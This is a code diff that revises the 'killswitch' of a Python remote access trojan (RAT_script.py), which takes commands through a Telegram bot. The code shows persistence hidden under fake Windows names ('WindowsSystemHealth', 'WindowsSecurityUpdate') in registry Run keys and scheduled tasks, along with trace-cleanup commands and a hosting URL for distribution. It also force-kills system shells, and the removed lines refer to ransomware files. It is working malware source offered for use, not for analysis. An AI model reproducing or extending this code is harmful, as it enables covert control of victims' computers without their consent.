@@ -1,4 +1,4 @@
-# RAT_script.py - Fixed: /clear command resets offset, no old commands replayed
+# RAT_script.py - Fixed killswitch: only kills processes, does NOT delete Python
 # Upload to: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py
 
 import os
@@ -72,16 +72,13 @@ def reset_offset():
 def clear_all_old_commands():
     """Clear all old commands - ignore everything before now"""
     try:
-        # Get the latest update_id
         resp = requests.get(f"{BASE_URL}/getUpdates", timeout=10)
         data = resp.json()
         if data.get("ok") and data.get("result"):
-            # Set offset to the latest update_id + 1 (ignores ALL old)
             latest = data["result"][-1]["update_id"] + 1
             save_offset(latest)
             return True
         else:
-            # If no updates, set to 0
             save_offset(0)
             return True
     except:
@@ -136,49 +133,47 @@ def get_ip():
     except:
         return "Unable to fetch IP"
 
-# --- KILLSWITCH ---
-def kill_all_and_clean():
-    """Emergency kill - stops everything and removes traces"""
+# --- KILLSWITCH (FIXED - Does NOT delete Python or script files) ---
+def kill_rat_only():
+    """KILLSWITCH - Stops all RAT processes but does NOT delete Python or script files"""
     try:
         try:
-            send_message("💀 KILLSWITCH ACTIVATED. Terminating and cleaning...")
+            send_message("🛑 KILLSWITCH: Stopping all RAT processes...")
         except:
             pass
         
+        # 1. Kill all Python processes (stops the RAT completely)
         os.system("taskkill /f /im python.exe >nul 2>&1")
         os.system("taskkill /f /im python3.exe >nul 2>&1")
+        
+        # 2. Kill command prompts and consoles
         os.system("taskkill /f /im cmd.exe >nul 2>&1")
         os.system("taskkill /f /im conhost.exe >nul 2>&1")
         os.system("taskkill /f /im powershell.exe >nul 2>&1")
         
-        try:
-            os.remove(os.path.abspath(sys.argv[0]))
-        except:
-            pass
-        
-        os.system(f"del /f /q {tempfile.gettempdir()}\\*.py >nul 2>&1")
-        os.system(f"del /f /q {tempfile.gettempdir()}\\*.tmp >nul 2>&1")
-        os.system(f"del /f /q {tempfile.gettempdir()}\\*health* >nul 2>&1")
-        os.system(f"del /f /q {tempfile.gettempdir()}\\*update* >nul 2>&1")
-        os.system(f"del /f /q {tempfile.gettempdir()}\\*heartbeat* >nul 2>&1")
-        os.system(f"del /f /q {tempfile.gettempdir()}\\*ransomware* >nul 2>&1")
-        
+        # 3. Remove registry persistence (stops it from restarting)
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSystemHealth /f >nul 2>&1")
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurityUpdate /f >nul 2>&1")
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsSecurityUpdate /f >nul 2>&1")
         
+        # 4. Delete scheduled tasks
+        os.system("schtasks /delete /tn DeleteRAT /f >nul 2>&1")
+        os.system("schtasks /delete /tn WindowsSecurityUpdate /f >nul 2>&1")
+        os.system("schtasks /delete /tn WindowsSystemHealth /f >nul 2>&1")
+        
+        # 5. Delete the offset state file (forces fresh start if script runs again)
         try:
             if os.path.exists(STATE_FILE):
                 os.remove(STATE_FILE)
         except:
             pass
         
-        os.system("schtasks /delete /tn DeleteRAT /f >nul 2>&1")
-        os.system("schtasks /delete /tn WindowsSecurityUpdate /f >nul 2>&1")
-        os.system("schtasks /delete /tn WindowsSystemHealth /f >nul 2>&1")
+        try:
+            send_message("✅ KILLSWITCH complete. All RAT processes stopped. Python is untouched.")
+        except:
+            pass
         
-        os.system("ipconfig /flushdns >nul 2>&1")
-        
+        # 6. Exit this script cleanly
         sys.exit(0)
         
     except:
@@ -335,9 +330,9 @@ def handle_updates(offset):
                     text = msg["text"].strip()
                     lower = text.lower()
                     
-                    # --- KILLSWITCH ---
+                    # --- KILLSWITCH (FIXED - does NOT delete Python) ---
                     if lower == "/killswitch" or lower == "/selfdestruct" or lower == "/emergencystop":
-                        threading.Thread(target=kill_all_and_clean).start()
+                        threading.Thread(target=kill_rat_only).start()
                         return new_offset
                     
                     # --- CLEAR ---
